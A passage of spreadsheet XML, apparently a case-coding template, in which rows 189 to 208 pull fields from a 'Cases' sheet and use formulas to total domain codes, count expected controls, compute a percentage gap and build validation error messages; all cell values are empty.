        <f>IF(AI189="","",IF(AI189=0,"No domain coded 1; ","")&amp;IF(M189="","Primary domain missing; ",IF(IFERROR(INDEX(E189:L189,1,M189),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N189:AG189)&lt;&gt;AJ189,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH189="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN189" s="13">
        <f>IF(AND(AI189&lt;&gt;"",AM189=""),1,0)</f>
        <v/>
      </c>
      <c r="AO189" s="14" t="n"/>
    </row>
    <row r="190">
      <c r="A190" s="11">
        <f>Cases!A190</f>
        <v/>
      </c>
      <c r="B190" s="11">
        <f>Cases!B190</f>
        <v/>
      </c>
      <c r="C190" s="11">
        <f>Cases!C190</f>
        <v/>
      </c>
      <c r="D190" s="11">
        <f>IF(Cases!F190="",LEFT(Cases!G190,120),Cases!F190)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E190:L190)=0,"",SUM(E190:L190))</f>
        <v/>
      </c>
      <c r="AJ190" s="13">
        <f>IF(AI190="","",N(E190)*3+N(F190)*2+N(G190)*2+N(H190)*2+N(I190)*2+N(J190)*3+N(K190)*3+N(L190)*3)</f>
        <v/>
      </c>
      <c r="AK190" s="13">
        <f>IF(AI190="","",COUNTIF(N190:AG190,1))</f>
        <v/>
      </c>
      <c r="AL190" s="13">
        <f>IF(OR(AJ190="",AJ190=0),"",ROUND(100*(AJ190-AK190)/AJ190,1))</f>
        <v/>
      </c>
      <c r="AM190" s="11">
        <f>IF(AI190="","",IF(AI190=0,"No domain coded 1; ","")&amp;IF(M190="","Primary domain missing; ",IF(IFERROR(INDEX(E190:L190,1,M190),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N190:AG190)&lt;&gt;AJ190,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH190="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN190" s="13">
        <f>IF(AND(AI190&lt;&gt;"",AM190=""),1,0)</f>
        <v/>
      </c>
      <c r="AO190" s="14" t="n"/>
    </row>
    <row r="191">
      <c r="A191" s="11">
        <f>Cases!A191</f>
        <v/>
      </c>
      <c r="B191" s="11">
        <f>Cases!B191</f>
        <v/>
      </c>
      <c r="C191" s="11">
        <f>Cases!C191</f>
        <v/>
      </c>
      <c r="D191" s="11">
        <f>IF(Cases!F191="",LEFT(Cases!G191,120),Cases!F191)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E191:L191)=0,"",SUM(E191:L191))</f>
        <v/>
      </c>
      <c r="AJ191" s="13">
        <f>IF(AI191="","",N(E191)*3+N(F191)*2+N(G191)*2+N(H191)*2+N(I191)*2+N(J191)*3+N(K191)*3+N(L191)*3)</f>
        <v/>
      </c>
      <c r="AK191" s="13">
        <f>IF(AI191="","",COUNTIF(N191:AG191,1))</f>
        <v/>
      </c>
      <c r="AL191" s="13">
        <f>IF(OR(AJ191="",AJ191=0),"",ROUND(100*(AJ191-AK191)/AJ191,1))</f>
        <v/>
      </c>
      <c r="AM191" s="11">
        <f>IF(AI191="","",IF(AI191=0,"No domain coded 1; ","")&amp;IF(M191="","Primary domain missing; ",IF(IFERROR(INDEX(E191:L191,1,M191),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N191:AG191)&lt;&gt;AJ191,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH191="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN191" s="13">
        <f>IF(AND(AI191&lt;&gt;"",AM191=""),1,0)</f>
        <v/>
      </c>
      <c r="AO191" s="14" t="n"/>
    </row>
    <row r="192">
      <c r="A192" s="11">
        <f>Cases!A192</f>
        <v/>
      </c>
      <c r="B192" s="11">
        <f>Cases!B192</f>
        <v/>
      </c>
      <c r="C192" s="11">
        <f>Cases!C192</f>
        <v/>
      </c>
      <c r="D192" s="11">
        <f>IF(Cases!F192="",LEFT(Cases!G192,120),Cases!F192)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E192:L192)=0,"",SUM(E192:L192))</f>
        <v/>
      </c>
      <c r="AJ192" s="13">
        <f>IF(AI192="","",N(E192)*3+N(F192)*2+N(G192)*2+N(H192)*2+N(I192)*2+N(J192)*3+N(K192)*3+N(L192)*3)</f>
        <v/>
      </c>
      <c r="AK192" s="13">
        <f>IF(AI192="","",COUNTIF(N192:AG192,1))</f>
        <v/>
      </c>
      <c r="AL192" s="13">
        <f>IF(OR(AJ192="",AJ192=0),"",ROUND(100*(AJ192-AK192)/AJ192,1))</f>
        <v/>
      </c>
      <c r="AM192" s="11">
        <f>IF(AI192="","",IF(AI192=0,"No domain coded 1; ","")&amp;IF(M192="","Primary domain missing; ",IF(IFERROR(INDEX(E192:L192,1,M192),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N192:AG192)&lt;&gt;AJ192,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH192="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN192" s="13">
        <f>IF(AND(AI192&lt;&gt;"",AM192=""),1,0)</f>
        <v/>
      </c>
      <c r="AO192" s="14" t="n"/>
    </row>
    <row r="193">
      <c r="A193" s="11">
        <f>Cases!A193</f>
        <v/>
      </c>
      <c r="B193" s="11">
        <f>Cases!B193</f>
        <v/>
      </c>
      <c r="C193" s="11">
        <f>Cases!C193</f>
        <v/>
      </c>
      <c r="D193" s="11">
        <f>IF(Cases!F193="",LEFT(Cases!G193,120),Cases!F193)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E193:L193)=0,"",SUM(E193:L193))</f>
        <v/>
      </c>
      <c r="AJ193" s="13">
        <f>IF(AI193="","",N(E193)*3+N(F193)*2+N(G193)*2+N(H193)*2+N(I193)*2+N(J193)*3+N(K193)*3+N(L193)*3)</f>
        <v/>
      </c>
      <c r="AK193" s="13">
        <f>IF(AI193="","",COUNTIF(N193:AG193,1))</f>
        <v/>
      </c>
      <c r="AL193" s="13">
        <f>IF(OR(AJ193="",AJ193=0),"",ROUND(100*(AJ193-AK193)/AJ193,1))</f>
        <v/>
      </c>
      <c r="AM193" s="11">
        <f>IF(AI193="","",IF(AI193=0,"No domain coded 1; ","")&amp;IF(M193="","Primary domain missing; ",IF(IFERROR(INDEX(E193:L193,1,M193),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N193:AG193)&lt;&gt;AJ193,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH193="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN193" s="13">
        <f>IF(AND(AI193&lt;&gt;"",AM193=""),1,0)</f>
        <v/>
      </c>
      <c r="AO193" s="14" t="n"/>
    </row>
    <row r="194">
      <c r="A194" s="11">
        <f>Cases!A194</f>
        <v/>
      </c>
      <c r="B194" s="11">
        <f>Cases!B194</f>
        <v/>
      </c>
      <c r="C194" s="11">
        <f>Cases!C194</f>
        <v/>
      </c>
      <c r="D194" s="11">
        <f>IF(Cases!F194="",LEFT(Cases!G194,120),Cases!F194)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E194:L194)=0,"",SUM(E194:L194))</f>
        <v/>
      </c>
      <c r="AJ194" s="13">
        <f>IF(AI194="","",N(E194)*3+N(F194)*2+N(G194)*2+N(H194)*2+N(I194)*2+N(J194)*3+N(K194)*3+N(L194)*3)</f>
        <v/>
      </c>
      <c r="AK194" s="13">
        <f>IF(AI194="","",COUNTIF(N194:AG194,1))</f>
        <v/>
      </c>
      <c r="AL194" s="13">
        <f>IF(OR(AJ194="",AJ194=0),"",ROUND(100*(AJ194-AK194)/AJ194,1))</f>
        <v/>
      </c>
      <c r="AM194" s="11">
        <f>IF(AI194="","",IF(AI194=0,"No domain coded 1; ","")&amp;IF(M194="","Primary domain missing; ",IF(IFERROR(INDEX(E194:L194,1,M194),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N194:AG194)&lt;&gt;AJ194,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH194="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN194" s="13">
        <f>IF(AND(AI194&lt;&gt;"",AM194=""),1,0)</f>
        <v/>
      </c>
      <c r="AO194" s="14" t="n"/>
    </row>
    <row r="195">
      <c r="A195" s="11">
        <f>Cases!A195</f>
        <v/>
      </c>
      <c r="B195" s="11">
        <f>Cases!B195</f>
        <v/>
      </c>
      <c r="C195" s="11">
        <f>Cases!C195</f>
        <v/>
      </c>
      <c r="D195" s="11">
        <f>IF(Cases!F195="",LEFT(Cases!G195,120),Cases!F195)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E195:L195)=0,"",SUM(E195:L195))</f>
        <v/>
      </c>
      <c r="AJ195" s="13">
        <f>IF(AI195="","",N(E195)*3+N(F195)*2+N(G195)*2+N(H195)*2+N(I195)*2+N(J195)*3+N(K195)*3+N(L195)*3)</f>
        <v/>
      </c>
      <c r="AK195" s="13">
        <f>IF(AI195="","",COUNTIF(N195:AG195,1))</f>
        <v/>
      </c>
      <c r="AL195" s="13">
        <f>IF(OR(AJ195="",AJ195=0),"",ROUND(100*(AJ195-AK195)/AJ195,1))</f>
        <v/>
      </c>
      <c r="AM195" s="11">
        <f>IF(AI195="","",IF(AI195=0,"No domain coded 1; ","")&amp;IF(M195="","Primary domain missing; ",IF(IFERROR(INDEX(E195:L195,1,M195),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N195:AG195)&lt;&gt;AJ195,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH195="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN195" s="13">
        <f>IF(AND(AI195&lt;&gt;"",AM195=""),1,0)</f>
        <v/>
      </c>
      <c r="AO195" s="14" t="n"/>
    </row>
    <row r="196">
      <c r="A196" s="11">
        <f>Cases!A196</f>
        <v/>
      </c>
      <c r="B196" s="11">
        <f>Cases!B196</f>
        <v/>
      </c>
      <c r="C196" s="11">
        <f>Cases!C196</f>
        <v/>
      </c>
      <c r="D196" s="11">
        <f>IF(Cases!F196="",LEFT(Cases!G196,120),Cases!F196)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E196:L196)=0,"",SUM(E196:L196))</f>
        <v/>
      </c>
      <c r="AJ196" s="13">
        <f>IF(AI196="","",N(E196)*3+N(F196)*2+N(G196)*2+N(H196)*2+N(I196)*2+N(J196)*3+N(K196)*3+N(L196)*3)</f>
        <v/>
      </c>
      <c r="AK196" s="13">
        <f>IF(AI196="","",COUNTIF(N196:AG196,1))</f>
        <v/>
      </c>
      <c r="AL196" s="13">
        <f>IF(OR(AJ196="",AJ196=0),"",ROUND(100*(AJ196-AK196)/AJ196,1))</f>
        <v/>
      </c>
      <c r="AM196" s="11">
        <f>IF(AI196="","",IF(AI196=0,"No domain coded 1; ","")&amp;IF(M196="","Primary domain missing; ",IF(IFERROR(INDEX(E196:L196,1,M196),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N196:AG196)&lt;&gt;AJ196,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH196="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN196" s="13">
        <f>IF(AND(AI196&lt;&gt;"",AM196=""),1,0)</f>
        <v/>
      </c>
      <c r="AO196" s="14" t="n"/>
    </row>
    <row r="197">
      <c r="A197" s="11">
        <f>Cases!A197</f>
        <v/>
      </c>
      <c r="B197" s="11">
        <f>Cases!B197</f>
        <v/>
      </c>
      <c r="C197" s="11">
        <f>Cases!C197</f>
        <v/>
      </c>
      <c r="D197" s="11">
        <f>IF(Cases!F197="",LEFT(Cases!G197,120),Cases!F197)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E197:L197)=0,"",SUM(E197:L197))</f>
        <v/>
      </c>
      <c r="AJ197" s="13">
        <f>IF(AI197="","",N(E197)*3+N(F197)*2+N(G197)*2+N(H197)*2+N(I197)*2+N(J197)*3+N(K197)*3+N(L197)*3)</f>
        <v/>
      </c>
      <c r="AK197" s="13">
        <f>IF(AI197="","",COUNTIF(N197:AG197,1))</f>
        <v/>
      </c>
      <c r="AL197" s="13">
        <f>IF(OR(AJ197="",AJ197=0),"",ROUND(100*(AJ197-AK197)/AJ197,1))</f>
        <v/>
      </c>
      <c r="AM197" s="11">
        <f>IF(AI197="","",IF(AI197=0,"No domain coded 1; ","")&amp;IF(M197="","Primary domain missing; ",IF(IFERROR(INDEX(E197:L197,1,M197),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N197:AG197)&lt;&gt;AJ197,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH197="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN197" s="13">
        <f>IF(AND(AI197&lt;&gt;"",AM197=""),1,0)</f>
        <v/>
      </c>
      <c r="AO197" s="14" t="n"/>
    </row>
    <row r="198">
      <c r="A198" s="11">
        <f>Cases!A198</f>
        <v/>
      </c>
      <c r="B198" s="11">
        <f>Cases!B198</f>
        <v/>
      </c>
      <c r="C198" s="11">
        <f>Cases!C198</f>
        <v/>
      </c>
      <c r="D198" s="11">
        <f>IF(Cases!F198="",LEFT(Cases!G198,120),Cases!F198)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E198:L198)=0,"",SUM(E198:L198))</f>
        <v/>
      </c>
      <c r="AJ198" s="13">
        <f>IF(AI198="","",N(E198)*3+N(F198)*2+N(G198)*2+N(H198)*2+N(I198)*2+N(J198)*3+N(K198)*3+N(L198)*3)</f>
        <v/>
      </c>
      <c r="AK198" s="13">
        <f>IF(AI198="","",COUNTIF(N198:AG198,1))</f>
        <v/>
      </c>
      <c r="AL198" s="13">
        <f>IF(OR(AJ198="",AJ198=0),"",ROUND(100*(AJ198-AK198)/AJ198,1))</f>
        <v/>
      </c>
      <c r="AM198" s="11">
        <f>IF(AI198="","",IF(AI198=0,"No domain coded 1; ","")&amp;IF(M198="","Primary domain missing; ",IF(IFERROR(INDEX(E198:L198,1,M198),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N198:AG198)&lt;&gt;AJ198,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH198="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN198" s="13">
        <f>IF(AND(AI198&lt;&gt;"",AM198=""),1,0)</f>
        <v/>
      </c>
      <c r="AO198" s="14" t="n"/>
    </row>
    <row r="199">
      <c r="A199" s="11">
        <f>Cases!A199</f>
        <v/>
      </c>
      <c r="B199" s="11">
        <f>Cases!B199</f>
        <v/>
      </c>
      <c r="C199" s="11">
        <f>Cases!C199</f>
        <v/>
      </c>
      <c r="D199" s="11">
        <f>IF(Cases!F199="",LEFT(Cases!G199,120),Cases!F199)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E199:L199)=0,"",SUM(E199:L199))</f>
        <v/>
      </c>
      <c r="AJ199" s="13">
        <f>IF(AI199="","",N(E199)*3+N(F199)*2+N(G199)*2+N(H199)*2+N(I199)*2+N(J199)*3+N(K199)*3+N(L199)*3)</f>
        <v/>
      </c>
      <c r="AK199" s="13">
        <f>IF(AI199="","",COUNTIF(N199:AG199,1))</f>
        <v/>
      </c>
      <c r="AL199" s="13">
        <f>IF(OR(AJ199="",AJ199=0),"",ROUND(100*(AJ199-AK199)/AJ199,1))</f>
        <v/>
      </c>
      <c r="AM199" s="11">
        <f>IF(AI199="","",IF(AI199=0,"No domain coded 1; ","")&amp;IF(M199="","Primary domain missing; ",IF(IFERROR(INDEX(E199:L199,1,M199),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N199:AG199)&lt;&gt;AJ199,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH199="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN199" s="13">
        <f>IF(AND(AI199&lt;&gt;"",AM199=""),1,0)</f>
        <v/>
      </c>
      <c r="AO199" s="14" t="n"/>
    </row>
    <row r="200">
      <c r="A200" s="11">
        <f>Cases!A200</f>
        <v/>
      </c>
      <c r="B200" s="11">
        <f>Cases!B200</f>
        <v/>
      </c>
      <c r="C200" s="11">
        <f>Cases!C200</f>
        <v/>
      </c>
      <c r="D200" s="11">
        <f>IF(Cases!F200="",LEFT(Cases!G200,120),Cases!F200)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E200:L200)=0,"",SUM(E200:L200))</f>
        <v/>
      </c>
      <c r="AJ200" s="13">
        <f>IF(AI200="","",N(E200)*3+N(F200)*2+N(G200)*2+N(H200)*2+N(I200)*2+N(J200)*3+N(K200)*3+N(L200)*3)</f>
        <v/>
      </c>
      <c r="AK200" s="13">
        <f>IF(AI200="","",COUNTIF(N200:AG200,1))</f>
        <v/>
      </c>
      <c r="AL200" s="13">
        <f>IF(OR(AJ200="",AJ200=0),"",ROUND(100*(AJ200-AK200)/AJ200,1))</f>
        <v/>
      </c>
      <c r="AM200" s="11">
        <f>IF(AI200="","",IF(AI200=0,"No domain coded 1; ","")&amp;IF(M200="","Primary domain missing; ",IF(IFERROR(INDEX(E200:L200,1,M200),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N200:AG200)&lt;&gt;AJ200,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH200="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN200" s="13">
        <f>IF(AND(AI200&lt;&gt;"",AM200=""),1,0)</f>
        <v/>
      </c>
      <c r="AO200" s="14" t="n"/>
    </row>
    <row r="201">
      <c r="A201" s="11">
        <f>Cases!A201</f>
        <v/>
      </c>
      <c r="B201" s="11">
        <f>Cases!B201</f>
        <v/>
      </c>
      <c r="C201" s="11">
        <f>Cases!C201</f>
        <v/>
      </c>
      <c r="D201" s="11">
        <f>IF(Cases!F201="",LEFT(Cases!G201,120),Cases!F201)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E201:L201)=0,"",SUM(E201:L201))</f>
        <v/>
      </c>
      <c r="AJ201" s="13">
        <f>IF(AI201="","",N(E201)*3+N(F201)*2+N(G201)*2+N(H201)*2+N(I201)*2+N(J201)*3+N(K201)*3+N(L201)*3)</f>
        <v/>
      </c>
      <c r="AK201" s="13">
        <f>IF(AI201="","",COUNTIF(N201:AG201,1))</f>
        <v/>
      </c>
      <c r="AL201" s="13">
        <f>IF(OR(AJ201="",AJ201=0),"",ROUND(100*(AJ201-AK201)/AJ201,1))</f>
        <v/>
      </c>
      <c r="AM201" s="11">
        <f>IF(AI201="","",IF(AI201=0,"No domain coded 1; ","")&amp;IF(M201="","Primary domain missing; ",IF(IFERROR(INDEX(E201:L201,1,M201),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N201:AG201)&lt;&gt;AJ201,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH201="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN201" s="13">
        <f>IF(AND(AI201&lt;&gt;"",AM201=""),1,0)</f>
        <v/>
      </c>
      <c r="AO201" s="14" t="n"/>
    </row>
    <row r="202">
      <c r="A202" s="11">
        <f>Cases!A202</f>
        <v/>
      </c>
      <c r="B202" s="11">
        <f>Cases!B202</f>
        <v/>
      </c>
      <c r="C202" s="11">
        <f>Cases!C202</f>
        <v/>
      </c>
      <c r="D202" s="11">
        <f>IF(Cases!F202="",LEFT(Cases!G202,120),Cases!F202)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E202:L202)=0,"",SUM(E202:L202))</f>
        <v/>
      </c>
      <c r="AJ202" s="13">
        <f>IF(AI202="","",N(E202)*3+N(F202)*2+N(G202)*2+N(H202)*2+N(I202)*2+N(J202)*3+N(K202)*3+N(L202)*3)</f>
        <v/>
      </c>
      <c r="AK202" s="13">
        <f>IF(AI202="","",COUNTIF(N202:AG202,1))</f>
        <v/>
      </c>
      <c r="AL202" s="13">
        <f>IF(OR(AJ202="",AJ202=0),"",ROUND(100*(AJ202-AK202)/AJ202,1))</f>
        <v/>
      </c>
      <c r="AM202" s="11">
        <f>IF(AI202="","",IF(AI202=0,"No domain coded 1; ","")&amp;IF(M202="","Primary domain missing; ",IF(IFERROR(INDEX(E202:L202,1,M202),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N202:AG202)&lt;&gt;AJ202,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH202="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN202" s="13">
        <f>IF(AND(AI202&lt;&gt;"",AM202=""),1,0)</f>
        <v/>
      </c>
      <c r="AO202" s="14" t="n"/>
    </row>
    <row r="203">
      <c r="A203" s="11">
        <f>Cases!A203</f>
        <v/>
      </c>
      <c r="B203" s="11">
        <f>Cases!B203</f>
        <v/>
      </c>
      <c r="C203" s="11">
        <f>Cases!C203</f>
        <v/>
      </c>
      <c r="D203" s="11">
        <f>IF(Cases!F203="",LEFT(Cases!G203,120),Cases!F203)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E203:L203)=0,"",SUM(E203:L203))</f>
        <v/>
      </c>
      <c r="AJ203" s="13">
        <f>IF(AI203="","",N(E203)*3+N(F203)*2+N(G203)*2+N(H203)*2+N(I203)*2+N(J203)*3+N(K203)*3+N(L203)*3)</f>
        <v/>
      </c>
      <c r="AK203" s="13">
        <f>IF(AI203="","",COUNTIF(N203:AG203,1))</f>
        <v/>
      </c>
      <c r="AL203" s="13">
        <f>IF(OR(AJ203="",AJ203=0),"",ROUND(100*(AJ203-AK203)/AJ203,1))</f>
        <v/>
      </c>
      <c r="AM203" s="11">
        <f>IF(AI203="","",IF(AI203=0,"No domain coded 1; ","")&amp;IF(M203="","Primary domain missing; ",IF(IFERROR(INDEX(E203:L203,1,M203),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N203:AG203)&lt;&gt;AJ203,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH203="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN203" s="13">
        <f>IF(AND(AI203&lt;&gt;"",AM203=""),1,0)</f>
        <v/>
      </c>
      <c r="AO203" s="14" t="n"/>
    </row>
    <row r="204">
      <c r="A204" s="11">
        <f>Cases!A204</f>
        <v/>
      </c>
      <c r="B204" s="11">
        <f>Cases!B204</f>
        <v/>
      </c>
      <c r="C204" s="11">
        <f>Cases!C204</f>
        <v/>
      </c>
      <c r="D204" s="11">
        <f>IF(Cases!F204="",LEFT(Cases!G204,120),Cases!F204)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E204:L204)=0,"",SUM(E204:L204))</f>
        <v/>
      </c>
      <c r="AJ204" s="13">
        <f>IF(AI204="","",N(E204)*3+N(F204)*2+N(G204)*2+N(H204)*2+N(I204)*2+N(J204)*3+N(K204)*3+N(L204)*3)</f>
        <v/>
      </c>
      <c r="AK204" s="13">
        <f>IF(AI204="","",COUNTIF(N204:AG204,1))</f>
        <v/>
      </c>
      <c r="AL204" s="13">
        <f>IF(OR(AJ204="",AJ204=0),"",ROUND(100*(AJ204-AK204)/AJ204,1))</f>
        <v/>
      </c>
      <c r="AM204" s="11">
        <f>IF(AI204="","",IF(AI204=0,"No domain coded 1; ","")&amp;IF(M204="","Primary domain missing; ",IF(IFERROR(INDEX(E204:L204,1,M204),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N204:AG204)&lt;&gt;AJ204,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH204="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN204" s="13">
        <f>IF(AND(AI204&lt;&gt;"",AM204=""),1,0)</f>
        <v/>
      </c>
      <c r="AO204" s="14" t="n"/>
    </row>
    <row r="205">
      <c r="A205" s="11">
        <f>Cases!A205</f>
        <v/>
      </c>
      <c r="B205" s="11">
        <f>Cases!B205</f>
        <v/>
      </c>
      <c r="C205" s="11">
        <f>Cases!C205</f>
        <v/>
      </c>
      <c r="D205" s="11">
        <f>IF(Cases!F205="",LEFT(Cases!G205,120),Cases!F205)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E205:L205)=0,"",SUM(E205:L205))</f>
        <v/>
      </c>
      <c r="AJ205" s="13">
        <f>IF(AI205="","",N(E205)*3+N(F205)*2+N(G205)*2+N(H205)*2+N(I205)*2+N(J205)*3+N(K205)*3+N(L205)*3)</f>
        <v/>
      </c>
      <c r="AK205" s="13">
        <f>IF(AI205="","",COUNTIF(N205:AG205,1))</f>
        <v/>
      </c>
      <c r="AL205" s="13">
        <f>IF(OR(AJ205="",AJ205=0),"",ROUND(100*(AJ205-AK205)/AJ205,1))</f>
        <v/>
      </c>
      <c r="AM205" s="11">
        <f>IF(AI205="","",IF(AI205=0,"No domain coded 1; ","")&amp;IF(M205="","Primary domain missing; ",IF(IFERROR(INDEX(E205:L205,1,M205),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N205:AG205)&lt;&gt;AJ205,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH205="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN205" s="13">
        <f>IF(AND(AI205&lt;&gt;"",AM205=""),1,0)</f>
        <v/>
      </c>
      <c r="AO205" s="14" t="n"/>
    </row>
    <row r="206">
      <c r="A206" s="11">
        <f>Cases!A206</f>
        <v/>
      </c>
      <c r="B206" s="11">
        <f>Cases!B206</f>
        <v/>
      </c>
      <c r="C206" s="11">
        <f>Cases!C206</f>
        <v/>
      </c>
      <c r="D206" s="11">
        <f>IF(Cases!F206="",LEFT(Cases!G206,120),Cases!F206)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E206:L206)=0,"",SUM(E206:L206))</f>
        <v/>
      </c>
      <c r="AJ206" s="13">
        <f>IF(AI206="","",N(E206)*3+N(F206)*2+N(G206)*2+N(H206)*2+N(I206)*2+N(J206)*3+N(K206)*3+N(L206)*3)</f>
        <v/>
      </c>
      <c r="AK206" s="13">
        <f>IF(AI206="","",COUNTIF(N206:AG206,1))</f>
        <v/>
      </c>
      <c r="AL206" s="13">
        <f>IF(OR(AJ206="",AJ206=0),"",ROUND(100*(AJ206-AK206)/AJ206,1))</f>
        <v/>
      </c>
      <c r="AM206" s="11">
        <f>IF(AI206="","",IF(AI206=0,"No domain coded 1; ","")&amp;IF(M206="","Primary domain missing; ",IF(IFERROR(INDEX(E206:L206,1,M206),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N206:AG206)&lt;&gt;AJ206,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH206="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN206" s="13">
        <f>IF(AND(AI206&lt;&gt;"",AM206=""),1,0)</f>
        <v/>
      </c>
      <c r="AO206" s="14" t="n"/>
    </row>
    <row r="207">
      <c r="A207" s="11">
        <f>Cases!A207</f>
        <v/>
      </c>
      <c r="B207" s="11">
        <f>Cases!B207</f>
        <v/>
      </c>
      <c r="C207" s="11">
        <f>Cases!C207</f>
        <v/>
      </c>
      <c r="D207" s="11">
        <f>IF(Cases!F207="",LEFT(Cases!G207,120),Cases!F207)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E207:L207)=0,"",SUM(E207:L207))</f>
        <v/>
      </c>
      <c r="AJ207" s="13">
        <f>IF(AI207="","",N(E207)*3+N(F207)*2+N(G207)*2+N(H207)*2+N(I207)*2+N(J207)*3+N(K207)*3+N(L207)*3)</f>
        <v/>
      </c>
      <c r="AK207" s="13">
        <f>IF(AI207="","",COUNTIF(N207:AG207,1))</f>
        <v/>
      </c>
      <c r="AL207" s="13">
        <f>IF(OR(AJ207="",AJ207=0),"",ROUND(100*(AJ207-AK207)/AJ207,1))</f>
        <v/>
      </c>
      <c r="AM207" s="11">
        <f>IF(AI207="","",IF(AI207=0,"No domain coded 1; ","")&amp;IF(M207="","Primary domain missing; ",IF(IFERROR(INDEX(E207:L207,1,M207),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N207:AG207)&lt;&gt;AJ207,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH207="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN207" s="13">
        <f>IF(AND(AI207&lt;&gt;"",AM207=""),1,0)</f>
        <v/>
      </c>
      <c r="AO207" s="14" t="n"/>
    </row>
    <row r="208">
      <c r="A208" s="11">
        <f>Cases!A208</f>
        <v/>
      </c>
      <c r="B208" s="11">
        <f>Cases!B208</f>
        <v/>
      </c>
      <c r="C208" s="11">
        <f>Cases!C208</f>
        <v/>
      </c>
      <c r="D208" s="11">
        <f>IF(Cases!F208="",LEFT(Cases!G208,120),Cases!F208)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E208:L208)=0,"",SUM(E208:L208))</f>
        <v/>
      </c>
      <c r="AJ208" s="13">
        <f>IF(AI208="","",N(E208)*3+N(F208)*2+N(G208)*2+N(H208)*2+N(I208)*2+N(J208)*3+N(K208)*3+N(L208)*3)</f>
        <v/>
      </c>
      <c r="AK208" s="13">
